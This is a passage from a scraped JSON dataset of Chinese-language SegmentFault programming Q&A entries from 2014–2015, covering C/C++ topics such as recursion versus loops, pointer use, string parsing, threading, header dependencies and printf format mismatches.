对上面内容有兴趣的童鞋可以去看看 <a href=\"http://en.wikipedia.org/wiki/Continuation-passing_style\" rel=\"nofollow\"></a><a href=\"http://en.wikipedia.org/wiki/Continuation-passing_style\" rel=\"nofollow\">http://en.wikipedia.org/wiki/Continuation-passing_style</a><br>\nPPS. 其实从“理解”这个角度而言，递归往往更容易更清晰，因为它天生就是一个把高复杂度问题分解为低复杂度的过程。</br></p>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000000506475\">\n<ol>\n<li>所有递归都能写成尾递归吗？</li>\n<li>所有尾递归都能写成循环吗？</li>\n</ol>\n<p>如果上面两个问题的答案都是yes，那么就获得了一种构造证明方法。</p>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000000505245\">\n<p>能。大学计科有讲这个的。而且反过来也成立。</p>\n<p>你想啊，递归调用就是把参数压栈。改成循环，我手动建个栈，每次循环把需要的数据压进去，循环完弹出来不就可以了么。</p>\n<p>递归 vs 循环：</p>\n<ol>\n<li>人脑不易理解？你看看著名的斐波那契数列的递归定义，写成递归容易还是循环容易？哪个容易理解取决于你的问题的解是怎么表述的。如果你是解的提出者怎么办？习惯了哪个你肯定会自然而然地用哪个。循环在编程界一直是大多数，所以嘛，你明白了？</li>\n<li>普通递归总是要压栈的。递归的层数多了，栈就要爆了。怎么办呢，有一种叫<strong>尾递归</strong>的优化，也叫<strong>尾调用</strong>。就是每次到返回前的最后一步才进行递归调用，这样的情况就可以保持栈不随着递归过程一直增长。不仅高效，还直观。但是很多问题的尾递归解本身不直观。</li>\n</ol>\n</div>",
      "attention": "0",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000505204\">\n<p>之所以会有这种想法，基于两个理由：</p>\n<ol>\n<li>\n<p>递归本质上是在进行压栈操作，人脑不易理解，尽管很多人都在尝试，相比之下，循环就容易理解多了。</p>\n<p>这有一篇文章深入地介绍了递归，<a href=\"http://blog.csdn.net/theknotyouknow/article/details/24435291\" rel=\"nofollow\">http://blog.csdn.net/theknotyouknow/article/details/24435291</a></p>\n</li>\n<li><p>循环执行效率比递归高很多。</p></li>\n</ol>\n<p>在知乎上搜了一下，感觉回答的并不是很好，还请各位不吝赐教。</p>\n</div>",
      "favourite": "6",
      "glance": "4.1k",
      "tags": [
        "编程",
        "程序员",
        "c++",
        "算法"
      ],
      "time": "2014-05-14",
      "title": "请问循环能代替所有递归吗？",
      "url": "https://segmentfault.com/q/1010000000505204"
    },
    {
      "answer1": "",
      "answer2": "",
      "answer_accepted": "",
      "attention": "0",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000522745\">\n<p>eclipse版本 ： indigo<br>\ncdt版本 ：8.0.0<br>\n已经把环境变量设置好，同时#include&lt;stdlib.h&gt;<br>\n但提示 Function 'free' could not be resolved<br>\n其余所有stdlib中的function也都不可用</br></br></br></br></p>\n</div>",
      "favourite": "0",
      "glance": "1.7k",
      "tags": [
        "eclipse",
        "cdt",
        "c++",
        "mingw",
        "stdlib"
      ],
      "time": "2014-05-28",
      "title": "eclipse+cdt+mingw stdlib.h中的库函数无法使用",
      "url": "https://segmentfault.com/q/1010000000522745"
    },
    {
      "answer1": "",
      "answer2": "",
      "answer_accepted": "",
      "attention": "1",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000535492\">\n<p>题主想通过看一些项目的代码来学习C/C++，可是自己写C/C++最多只写过一两个文件、几百行代码的项目，并且对于很多标准和习惯用法并不是很了解，直接去看那些比较有名的开源项目根本毫无头绪。<br>\n所以希望大家能推荐一些比较小的、容易看懂的项目。</br></p>\n</div>",
      "favourite": "2",
      "glance": "5.7k",
      "tags": [
        "编程",
        "c++",
        "c"
      ],
      "time": "2014-06-06",
      "title": "有哪些比较小的C/C++开源项目，适合初学者学习用的？",
      "url": "https://segmentfault.com/q/1010000000535492"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000000661997\">\n<p>我到觉得，C++不用指针就等于折了C++的翅膀，但是使用指针是需要很小心的。</p>\n<p>基本上来说，就是哪里 new 就在哪里 delete （特殊情况就是在 create() 方法里 new 在 remove() 方法里 delete，但同时需要 create() 和 remove() 尽量在同一个代码块内，依次类推，最典型的就是构造里 new，析构里 delete。</p>\n<p>另外，尽量不要使用指针运算，如果需要运算的地方，尽可能的使用数据方式处理，比如 *(p++)，可以写成 p[1]，这样避免改变指针的值，造成混乱。</p>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000000662470\">\n<p>如果<strong>确定</strong>用指针你也能控制住对象的生命周期, 那可以用指针. (注意要考虑到 C++ 异常)<br>\n否则, 用智能指针.</br></p>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000000661851\">\n<p>能不用指针就不用指针，智能指针和引用都是很好的选择。</p>\n</div>",
      "attention": "0",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000661687\">\n<p>感觉我平时能用指针都用指针的说……</p>\n</div>",
      "favourite": "2",
      "glance": "3k",
      "tags": [
        "c++"
      ],
      "time": "2014-09-08",
      "title": "话说在C++中，什么时候用指针？什么时候直接用变量？",
      "url": "https://segmentfault.com/q/1010000000661687"
    },
    {
      "answer1": "",
      "answer2": "",
      "answer_accepted": "",
      "attention": "1",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000741529\">\n<p>给定一个<code>有序</code>链表，去除其中重复的元素,让每个重复的元素只显示一次，我是用单指针做的，但是很奇怪当输入为｛1，1，....｝这种头部元素重复的情况下不能去重，其它情况没有问题，我知道是头部元素没处理好，但到底是哪一行代码逻辑不对呢？代码如下：</p>\n<pre><code>struct ListNode\n{\n    int val;\n    ListNode *next;\n    ListNode(int x) : val(x), next(NULL) {}\n};\nclass Solution\n{\npublic:\n    ListNode *deleteDuplicates(ListNode *head)\n    {\n        ListNode **pcur=&amp;head;\n        if(head==NULL||head-&gt;next==NULL){\n        return head;\n        }\n        while((*pcur)-&gt;next!=NULL)\n        {\n            if((*pcur)-&gt;val==(*pcur)-&gt;next-&gt;val)\n            {\n                *pcur=(*pcur)-&gt;next;\n\n            }\n            else\n            {\n                pcur=&amp;((*pcur)-&gt;next);\n\n            }\n        }\n        return head;\n    }\n};\n</code></pre>\n</div>",
      "favourite": "0",
      "glance": "1.2k",
      "tags": [
        "数据结构",
        "算法",
        "c++",
        "c"
      ],
      "time": "2014-10-26",
      "title": "去除有序列表中的重复元素",
      "url": "https://segmentfault.com/q/1010000000741529"
    },
    {
      "answer1": "",
      "answer2": "",
      "answer_accepted": "",
      "attention": "1",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000742758\">\n<p>用什么语言开发合适？<br>\n最终目标如何地位？<br>\n需要拟人分为父.母.感情这些吗？<br>\n如何能自我成长，不仅仅是收集和使用，还需要分析和组合，产生新的.<br>\n等等一大堆问题</br></br></br></br></p>\n</div>",
      "favourite": "0",
      "glance": "1.2k",
      "tags": [
        "c++"
      ],
      "time": "2014-10-27",
      "title": "我只想问各位对“人工智能”的开发有头绪吗?",
      "url": "https://segmentfault.com/q/1010000000742758"
    },
    {
      "answer1": "",
      "answer2": "",
      "answer_accepted": "",
      "attention": "2",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000750020\">\n<p>这么一道题：A={1,2,3,...,2015},B是A的一个子集，对B中任意三个元素x,y,z，都有x+y不等于z.<br>\n求B中元素最多时，集合B.<br>\nCard(B)的最大值是1008，Card(B)=1008时，B集合有且只有四个（应该很容易写出来：所有奇数集，{1008，……2015}，{1007，1009，……，2015}，{1007，……，2014}）<br>\n只有4个的证明还没想出来，想编程序找找反例。<br>\n用回溯法写了这个程序：算到N=101时，就悲剧了，更别提N=2015了。想想应该是2^N型的问题，大虾们有没有什么好办法？我自己感觉自己的回溯写得太烂了，有兴趣和时间的大虾能不能以此题写一个范例供我学习下。</br></br></br></br></p>\n<pre><code>#define _CRT_SECURE_NO_WARNINGS\n#include &lt;vector&gt;\n#include &lt;iostream&gt;\n#include &lt;algorithm&gt;\n#include &lt;cstdio&gt;\n#include &lt;cstdlib&gt;\n\nusing namespace std;\ntypedef vector&lt;int&gt; Set;\ntypedef vector&lt;vector&lt;int&gt; &gt; ResSet;\nint getMinChoice(Set status, Set b)\n{\n    unsigned int i,k;\n    k = b.size();\n    i = (k == 0)? 0 : b.back();\n    while (1){  \n        if (i+1 &gt; status.size())\n            break;\n        else if (status[i] == 0)\n            break;\n        i++;\n    }\n    return i;\n}\n\nint main()\n{\n    int num, temp, tmpindex,flag=0;\n    unsigned int k;\n\n    Set w;\n    ResSet res;\n    Set b;\n    Set status;\n    Set reslen;\n\n    //freopen(\"in.txt\", \"r\", stdin);\n    freopen(\"out.txt\", \"w\", stdout);\n    scanf(\"%d\", &amp;num);\n\n    for (int i = 0; i&lt;num; i++){\n        w.push_back(i + 1);\n        status.push_back(0);\n    }\n\n    while (1)\n    {\n        temp = getMinChoice(status, b);\n        if (temp &lt; num)\n        {\n            b.push_back(temp + 1);\n            flag = 1;\n            status[temp] = -1;\n            for (k = 0; k+1 &lt; b.size(); k++)\n            {\n                tmpindex = b[k] + temp;\n                if (tmpindex &lt; num)\n                status[tmpindex]++;\n            }\n        }\n        else \n        {\n            if (flag == 1)\n            {\n                if (b.size() == (num + 2) / 2)\n                {\n                    res.push_back(b);\n                }   \n                //reslen.push_back(b.size());\n                temp = b.back();\n                b.pop_back();\n                for (k = 0; k &lt; b.size(); k++)\n                {\n                    tmpindex = b[k] + temp - 1;\n                    if (tmpindex &lt; num)\n                    status[tmpindex]--;\n                }\n                flag = 0;\n            }\n            else if (flag == 0)\n            {\n                if (b.size() == 0)\n                    break;\n                temp = b.back();\n                b.pop_back();\n                for (k = 0; k &lt; b.size(); k++)\n                {\n                    tmpindex = b[k] + temp - 1;\n                    if (tmpindex &lt; num)\n                    status[tmpindex]--;\n                }\n                for (k = temp; k &lt; num; k++)\n                {\n                    if (status[k] == -1)\n                    status[k] = 0;\n                }\n            }\n        }\n    }\n    cout &lt;&lt; res.size() &lt;&lt; endl;\n        for (unsigned i = 0; i&lt; res.size(); i++)\n        {\n            Set b = res[i];\n            for (unsigned j = 0; j&lt;b.size(); j++)\n            {\n                cout &lt;&lt; b[j] &lt;&lt; \",\";\n            }\n            cout &lt;&lt; endl;\n        }\n    return 0;\n}\n</code></pre>\n</div>",
      "favourite": "0",
      "glance": "1.2k",
      "tags": [
        "c++",
        "算法",
        "组合数学",
        "回溯法"
      ],
      "time": "2014-10-30",
      "title": "组合数学题目的编程求解的效率问题",
      "url": "https://segmentfault.com/q/1010000000750020"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000000753202\">\n<p>直接上函数？调用库函数，直接分离，或者</p>\n<hr>\n<pre><code>for() {\nif(a[] == ' ')\nwhile\nb[] = i--;\n}\n</code></pre>\n</hr></div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000000753461\">\n<p>不知道有几个数的情况下，可以用istringstream</p>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000000753249\">\n<pre><code>int a, b, c, d;\nsscanf(\"123 45 56 89\", \"%d %d %d %d\", &amp;a, &amp;b, &amp;c, &amp;d);\n</code></pre>\n<p><a href=\"http://www.cplusplus.com/reference/cstdio/sscanf/\" rel=\"nofollow\">http://www.cplusplus.com/reference/cstdio/sscanf/</a></p>\n</div>",
      "attention": "0",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000753181\">\n<p>假设有以下字符串：</p>\n<pre><code>string str=\"123 45 56 89\";\n</code></pre>\n<p>现把其中连在一起的数字以整型格式单独取出来（int a=123,int b=45），有没有什么好方案？</p>\n</div>",
      "favourite": "0",
      "glance": "1.3k",
      "tags": [
        "c",
        "c++",
        "string",
        "算法"
      ],
      "time": "2014-11-01",
      "title": "C/C++如何将string内容分离？",
      "url": "https://segmentfault.com/q/1010000000753181"
    },
    {
      "answer1": "",
      "answer2": "",
      "answer_accepted": "",
      "attention": "0",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000753581\">\n<pre><code>int a;\nscanf(\"%d\",&amp;a);\ncin&gt;&gt;a;\n</code></pre>\n<p>ex：我想让用户输入整数，但是如果用户输入的不是我想要的类型如!%$#,abcd....都有什么方法或者函数去判断呢？</p>\n</div>",
      "favourite": "0",
      "glance": "2.1k",
      "tags": [
        "c",
        "c++"
      ],
      "time": "2014-11-02",
      "title": "C/C++如何判断用户输入是否合法？",
      "url": "https://segmentfault.com/q/1010000000753581"
    },
    {
      "answer1": "",
      "answer2": "",
      "answer_accepted": "",
      "attention": "3",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000002363606\">\n<html><body>\n<p><img data-src=\"/img/bVj41L\"/></p>\n<p>学校只学了cpp，关于头文件，还有外部依赖的都没有见过（头文件一般是直接调用的），</p>\n<p>1、现在有ER图和数据流程图，是否按照先看完cpp，如果中间有调用头文件再去看头文件？<br>\n2、直接根据调试cpp的顺序，看完cpp就ok了，可以无视头文件</br></p>\n<p>PS：系统：win7  编译器：VS2010  数据库：sql2008  项目运行正常，有ER图，数据流程图</p>\n</body></html>\n</div>",
      "favourite": "0",
      "glance": "2.1k",
      "tags": [
        "c++",
        "mfc",
        "源码学习"
      ],
      "time": "2014-11-22",
      "title": "如何阅读别人一个完整项目的源码",
      "url": "https://segmentfault.com/q/1010000002363606"
    },
    {
      "answer1": "",
      "answer2": "",
      "answer_accepted": "",
      "attention": "2",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000002392174\">\n<p>A big coorperation has N employees. The employees form a strict hierarchy. Each emplyee has at most one direct boss. At the same time, he or she can be in charge of many other employees as a boss. Of course, if A is B's boss and B is C's boss, A is C's boss too. In this question we only care about two properties of each employee, name and age. We define that pair ('Bill', 39) -&gt; 'Sarah' means 39-year-old Bill is Sarah's boss. Note that Bill is also an employee and may also has a boss. Given a list of information like this, you are supposed to build the hierarchy that supports one simple query: given an employee, ouput the name of the yongest age among all his or her bosses. If the employee has no boss, output his or her own name.</p>\n<p>The first line of input contains 2 integers P (0 &lt; P &lt; 1000) and Q (0 &lt; Q &lt; 1000). P is the number of pairs and Q is the number of queries. Each line in the next P lines contains the boss' name, age (10 &lt; age &lt; 100) and the employee's name. Nobody is assigned as his or her own boss. The next Q lines each contains an employee name. If the employee name being queried is not found, string \"I don't know who you are talking about.\" should be printed. All employee names only contain upper and lower case letters.</p>\n<p>The output should be Q lines of results in cooresponding to each query.</p>\n<p>Sample Input:</p>\n<p>1 3<br>\nBill 39 Sarah<br>\nSarah<br>\nBill<br>\nJayce</br></br></br></br></p>\n<p>Sample Output:</p>\n<p>Bill<br>\nBill<br>\nI don't know who you are talking about.</br></br></p>\n<p>题目大概是上面这样。。</p>\n<p>我用C＋＋写了一个，但是跑不起来。</p>\n<p>大致是这样。。</p>\n<p>typedef struct person {<br>\n    char *name;<br>\n    int age;<br>\n    person *boss;<br>\n} person;</br></br></br></br></p>\n<p>然后在赋值的时候建立连个数组，一个是放关系的(p_array)，一个是放想要查找的名字的(q_array)。</p>\n<p>最后在输出的时候通过两个for循环，去找是否有想对应的p_array[i].name存不存在，如果存在就判断是否有boss,有就输出他的boss，没有就输出他自己的名字。如果p_array[i].name不存在，就输出不存在。</p>\n<pre><code>#include &lt;stdio.h&gt;\n\ntypedef struct person {\n    char *name;\n    int age;\n    struct person *boss;\n} person;\n\nint main() {\n    int P;\n    printf(\"Input Number of Paris: \");\n    scanf(\"%d\", &amp;P);\n\n    int Q;\n    printf(\"Input Number of Queries: \");\n    scanf(\"%d\", &amp;Q);\n\n    person p_array[P];\n    char *boss_name;\n    int boss_age;\n    char *employee_name;\n    for (int i = 0; i &lt; P; i++) {\n        printf(\"Input the Boss's name: \");\n        scanf(\"%s\", &amp;boss_name);\n        printf(\"Input the Boss's age: \");\n        scanf(\"%d\", &amp;boss_age);\n        printf(\"Input the Employee's name: \");\n        scanf(\"%s\", &amp;employee_name);\n        p_array[i].name = employee_name;\n        p_array[i].boss-&gt;name = boss_name;\n        p_array[i].boss-&gt;age = boss_age;\n    }\n\n    for (int j = 0; j &lt; P; j++) {\n        printf(\"%s\\n\", p_array[j].name);\n    }\n    return 0;\n}\n</code></pre>\n</div>",
      "favourite": "0",
      "glance": "1.2k",
      "tags": [
        "算法",
        "c++"
      ],
      "time": "2014-11-27",
      "title": "算法问题求解～",
      "url": "https://segmentfault.com/q/1010000002392174"
    },
    {
      "answer1": "",
      "answer2": "",
      "answer_accepted": "",
      "attention": "2",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000002393201\">\n<p>我用 C++ 编写了一个 DLL，但是即将把 DLL 提供给 C# 调用，因为 C++ 非托管代码的缘故，导致我不知道如何编写 C# 的导入接口，就是类似于 DllImport 那样，具体地说就是我不知道如何用 DllImport，函数的参数是 char、char *、xonst char *、int、自定义的结构体等，那么应该如何导入</p>\n</div>",
      "favourite": "0",
      "glance": "1.7k",
      "tags": [
        "c#",
        "c++",
        "dll"
      ],
      "time": "2014-11-27",
      "title": "C# 调用 C++ DLL，DllImport",
      "url": "https://segmentfault.com/q/1010000002393201"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000003745493\">\n<p>我记得C++11的线程库是根据OpenMP进行封装的。pThread在性能和使用上和OpenMP还是差一些，个人认为，可以了解，如果没有时间，就没有深究的必要。</p>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000004001178\">\n<p>我认为：C++11提供的std::thread等也不是语言级别的支持，而是标准库的支持。其实学习起来和用法上c++ thread和pthread并没有什么区别之处（也许pthread有更多的参数？），还有就是你提到的pthread可以提供的其他东西。至于性能上我不认为两者会有什么区别。更多的区别可能是在移植性上。<br>所以，我觉得，不妨两个都学吧。</br></p>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000002426421\">\n<p>在POSIX系统中，你觉得能脱离PThread么，貌似底层就是PThread实现的。简单的用std::thread完全没有问题，但是复杂的功能，需要自定义的还是得基于PThread自行封装。STL更好的是算法和容器，多线程还不是非常好。仅代表个人看法。</p>\n</div>",
      "attention": "6",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000002426368\">\n<p>C++11对多线程的支持很完善，互斥量，锁，条件变量，原子操作一应俱全，posix线程库还能另外提供的也就是记录锁，消息队列，但这些都可以在需要时自行实现．而且用C++原生线程库的代码还能够跨平台.<br>\n请问现在实际工程中涉及多线程的部分向C++11原生多线程库迁移的如何了？使用posix线程库进行开发的情况还多不多？</br></p>\n</div>",
      "favourite": "0",
      "glance": "2.2k",
      "tags": [
        "c++11",
        "c++",
        "posix",
        "多线程"
      ],
      "time": "2014-12-16",
      "title": "在C++11引入了对多线程语言级别的支持之后，还有必要学习posix线程吗？",
      "url": "https://segmentfault.com/q/1010000002426368"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000002467311\">\n<p>Linus 大神會說「並行計算是浪費所有人的時間」。</p>\n<blockquote>\n<p>推崇所谓的“并行”极大地浪费了大家的时间。“并行更高效”的高大上理念纯粹是扯淡。大容量缓存可以提高效率。在一些没有附带缓存的微内核上搞并行毫无意义，除非是针对大量的规则运算（比如图形处理）。</p>\n</blockquote>\n<p><a href=\"http://www.realworldtech.com/forum/?threadid=146066&amp;curpostid=146227\" rel=\"nofollow\">http://www.realworldtech.com/forum/?threadid=146066&amp;curpostid=146227</a></p>\n<p>如果你這四個任務是彼此獨立的，那麼性能沒有顯著提升就一定是你程序的問題；<br>\n如果這四個任務彼此高度依賴，那麼沒有多少性能提升倒也並不奇怪。</br></p>\n<p>並行不是提升效率的靈丹妙藥，它只是對某些問題比順序執行更好用。</p>\n<p>樓上的公式未免太過簡單，把並行想像成簡單地切蛋糕，要真是如此，並行更高效的理念就永遠正確了。</p>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000002467660\">\n<p>Linus: talk is cheap show me the code</p>\n<p>不可能四个进程和一个进程效率一样，除非：1.你的4个进程实现成了串行2.整个计算过程本身的消费时间和进程切换时间相似。</p>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000002467657\">\n<p>先给个公式吧。</p>\n<p>所需线程数=CPU可用核心数/(1-阻塞系数)<br>\n其中计算密集型阻塞系数趋向于0，IO密集趋向于1。具体需要通过实验来确定。</br></p>\n<p>所以，你现在这种情况。</p>\n<p>所需线程数=8/(1-0)=8, 应该用8个线程来试试。而你这里只用了4个，虽然如此，性能还是应该比单线程要好，因为毕竟由4个核在分担计算量。</p>\n<p>但是，你却发现没有多大区别，我只能认为，你没有书写正确的多线程逻辑，造成名义上是多线程，实际上是串行的情况。</p>\n</div>",
      "attention": "6",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000002467301\">\n<p>1个CPU、4个核 intel 超线程技术，可看到8个核，但我只开4个进程，每个进程负责整个任务的四分之一的计算任务 和单个进程，跑起来的效率怎么差不多呢？</p>\n</div>",
      "favourite": "1",
      "glance": "1.5k",
      "tags": [
        "c++",
        "计算机科学",
        "并行",
        "多进程"
      ],
      "time": "2015-01-06",
      "title": "单机多进程做密集型科学计算靠谱吗？能节省时间吗…刚测试了下 ，发现并没用多大提升",
      "url": "https://segmentfault.com/q/1010000002467301"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000002494803\">\n<p>可以考虑下C++中的Impl惯用法。<br>\n把功能放到一个Impl类中，然后这个类持有Impl类的指针，而对外的接口通过调用Impl类的对应方法来实现。</br></p>\n<pre><code>//Stack.h\nclass Stack{\npublic:\n    Stack();\n    ~Stack();\npublic:\n    void push(int i);\n    int pop();\nprivate:\n    class StackImpl;//StackImpl类声明\n    StackImpl *pStackImpl;\n}\n\n// StackImpl.h\nclass StackImpl{\npublic:\n    StackImpl();\n    ~StackImpl();\npublic:\n    void push(int i);\n    int pop();\n}\n\n// Stack.cpp\n#include \"StackImpl.h\"\n\nvoid Stack::push(int i)\n{\n    pStackImpl-&gt;push(i);\n}\n...\n</code></pre>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000002494753\">\n<p>对于这种被多个类引用的类，应当保证接口的稳定，也就是.cpp文件里的实现可以做大的改动，但是.h文件要保持稳定，这就要求最初设计该类的时候考虑周全，还要有弹性，充分考虑之后可能需要添加进来的功能，先设计接口，再逐一实现，暂时不需要的可以预留接口不做实现。如果最初考虑不足，要在项目进展过程中代码量尚且没有多到难以维护的时候不断进行重构，直至每个常用类的接口设计都趋于合理和稳定，然后在这个基础上再去扩展。小至一个类，大到一个模块，一个组件，乃至整个项目都是这样，要在代码复杂到难以维护之前尽可能重构，直至接口趋于合理稳定再进行扩展。<br>\n不过说了这么多，好像对你这个问题也没什么帮助呵呵。</br></p>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000002496083\">\n<p>哦，这是个好问题，虽然老生常谈，但真正知道解决方案的人很少。《Effective C++》有介绍，同时推荐这本书给所有C++er。我这里就简单归纳一下。</p>\n<p>一个组织有问题的大型项目中，影响编译速度的最大问题就是头文件形成庞大的依赖网络，其中一个头文件修改就导致一大堆间接依赖的源代码文件需要重新编译。a.h包含b.h，b.h包含c.h，c.h又包含d.h，即使a.h和d.h似乎没什么关系，你修改d.h的时候还是无可避免a.cc被重新编译。</p>\n<p>首先得知道C++一个特性，函数分为声明和实现两部分是人所皆知，但类也可以分为前置声明和定义可能知道的人就比较少了，知道能怎么用就更少了，其实就是可以用来解决编译速度问题的。</p>\n<pre><code>class Object;//前置声明\n\nclass Object { //类定义\n    void Method();\n};\n\nvoid Object::Method() { //实现\n}\n</code></pre>\n<p>这三部分可以分在三个文件里写，分别是 \"filefwd.h\" \"file.h\" \"file.cc\"，后面一个包含前面一个。其中filefwd.h叫做“前置声明文件”，很多开源项目就是这样设计的。</p>\n<p>《Effective C++》归纳了很多时候你不需要包含\"file.h\"，只需要包含前置声明\"filefwd.h\"：</p>\n<ol>\n<li>使用类的引用或指针，包括作为智能指针时。 </li>\n<li>使用类作为返回类型。</li>\n</ol>\n<p>以下情况你必须包含\"file.h\"：</p>\n<ol>\n<li>使用类作为成员对象。</li>\n<li>使用类作为基类。</li>\n<li>使用类作为函数传值参数。</li>\n<li>访问类的成员函数或对象。</li>\n</ol>\n<p>例如，我现在开发一个功能func，其实现要调用Object的Method，我可以这样写：</p>\n<p>func.h:</p>\n<pre><code>#ifndef INCLUDE_FUNC_H\n#define INCLUDE_FUNC_H\n\n#include \"filefwd.h\"\nvoid DoSomething(Object&amp; obj); //使用Object的引用，无需包含file.h\n\n#endif\n</code></pre>\n<p>func.cc:</p>\n<pre><code>#include \"func.h\"\n#include \"file.h\"\nvoid DoSomething(Object&amp; obj) {\n    obj.Method(); //调用Object的成员函数，必须包含file.h\n}\n</code></pre>\n<p>这么折腾有什么用？你会发现绝大部分的.h文件都无需包含其它.h，而只需要包含fwd.h，而fwd.h由于不需要定义类的成员，所以依赖极少，很少包含别的文件。而只有.cc需要包含很多的.h。</p>\n<p>于是你的代码就形成了简洁的头文件依赖层次，.cc依赖*.h，.h依赖fwd.h，再不是一大堆.h互相依赖，每修改一个.h造成要重新编译的.cc很少，编译速度也更快。</p>\n<p>另外，还有一个要结合使用的技巧，就是 <a href=\"/u/spacewander\">@spacewander</a> 提到的Impl设计模式，其目的就是把更多的依赖往.cc文件移动，尽可能减小.h的依赖。例如，我要设计一个类class Object，需要使用vector作为内部实现，使用impl就可以避免在.h中包含vector。</p>\n<p>filefwd.h 前面说的前置声明文件:</p>\n<pre><code>#ifndef INCLUDE_FILE_FWD_H\n#define INCLUDE_FILE_FWD_H\n\nclass Object;\n\n#endif\n</code></pre>\n<p>file.h:</p>\n<pre><code>#ifndef INCLUDE_FILE_H\n#define INCLUDE_FILE_H\n\n#include \"filefwd.h\"\nclass Object { //一个包装的类，只有成员函数和一个指针\npublic:\n    Object();\n    ~Object();\n    void Method();\nprivate:\n    void* impl;\n};\n\n#endif\n</code></pre>\n<p>file.cc:</p>\n<pre><code>#include \"file.h\"\n#include &lt;vector&gt; //vector无需写在file.h中\n\nclass ObjectImpl { //一个被隐藏的实现类，就是上面指针指向的对象，所有成员对象和实现都写在这里。\npublic:\n    void ObjectImpl() {...}\n    void ~ObjectImpl() {...}\n    void Method() {...} //逻辑都在这里实现\nprivate:\n    std::vector&lt;int&gt; vec;\n};\n\nvoid Object::Object()\n    :impl(new ObjectImpl()) //构造时new一个实现类\n{ } \nvoid Object::~Object() {\n    delete (ObjectImpl*)impl; //析构时delete掉\n} \nvoid Object::Method() {\n    ((ObjectImpl*)impl)-&gt;Method(); //简单地把任务转给隐藏实现类。\n}\n</code></pre>\n<p>两种模式结合使用，不但形成优雅的“接口和实现分离”，编译时更是那个酸爽。不用担心多一次调用带来额外的运行期开销，实际上只要将impl类的所有方法加上inline（甚至编译器会自动加），性能完全没有损失。这样做的代价是每个模块都有大量的接口代码(看看上面的例子，几乎多了两倍)，甚至比逻辑本身更多，使用前需要权衡。我的经验是：为了让你的代码看起来更有逼格和其他程序猿仰慕的目光，值了！</p>\n</div>",
      "attention": "6",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000002494652\">\n<p>RT</p>\n<h3>关于类的设计 还真是个考验啊</h3>\n</div>",
      "favourite": "6",
      "glance": "1.9k",
      "tags": [
        "c++",
        "编译器",
        "优化"
      ],
      "time": "2015-01-18",
      "title": "一个C++工程中，许多个文件都include某一个类，当该类更新时，编译速度太慢，怎么办？",
      "url": "https://segmentfault.com/q/1010000002494652"
    },
    {
      "answer1": "",
      "answer2": "",
      "answer_accepted": "",
      "attention": "5",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000002534752\">\n<html><body>\n<p>源代码很简单，就是定义一个float变量a=2.5，int变量b=2</p>\n<p>然后将a,b分别按%d %f型输出。<br>\n当然没有按正确类型格式化输出肯定是有问题的。<br>\n但是按正确类型格式化输出也发生了很奇怪的问题。<br>\n源代码如下，VS2013下编译通过0 errors, 0 warnings。</br></br></br></p>\n<pre><code>#include &lt;stdio.h&gt;\nint main(void)\n{\n\nfloat a = 2.5;\nint b = 2;\n\n\nprintf(\"%d\\n%f\\n%d\\n%f\\n\", a, a, b, b);    /*这条语句的输出全是错的*/\nputchar('\\n');\n\nprintf(\"%f\\n%d\\n%f\\n%d\\n\", a, a, b, b);    /*这条语句的输出有两个对的两个错的，符合我的预期*/\n\nreturn(0);}\n</code></pre>\n<p>输出结果如下图<br><img data-src=\"/img/bVkNyZ\"/></br></p>\n<p>我的主要问题是，为什么第一个printf的输出没有一个是对的？<br>\n本人是小白，希望能有大神帮忙解答，多谢！</br></p>\n</body></html>\n</div>",
      "favourite": "1",
      "glance": "3.2k",
      "tags": [
        "c",
        "c++"
      ],
      "time": "2015-02-04",
      "title": "C语言中printf输出的奇怪错误",
      "url": "https://segmentfault.com/q/1010000002534752"
    },
    {
      "answer1": "",
      "answer2": "",
      "answer_accepted": "",
      "attention": "3",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000002568358\">\n<p>1.</p>\n<p>中文版：</p>\n<blockquote>\n<p>设置一个类型为auto的引用时，初始值中的顶层常量属性依然保留。和往常一样，如果我们给初始值绑定一个引用，则此时的常量就不是顶层常量了。”</p>\n</blockquote>\n<p>英文版：</p>\n<blockquote>\n<p>When we ask for a reference to an auto-deduced type, top-level consts in the initializer are not ignored. As usual, consts are not top-level when we bind a reference to an initializer</p>\n</blockquote>\n<p>怎么理解这段话呢？能否举例说明？</p>\n</div>",
      "favourite": "5",
      "glance": "1.2k",
      "tags": [
        "c++",
        "c++11"
      ],
      "time": "2015-02-27",
      "title": "const的一些问题（c++primer 第五版）",
      "url": "https://segmentfault.com/q/1010000002568358"
    },
    {
      "answer1": "",
      "answer2": "",
      "answer_accepted": "",
      "attention": "2",
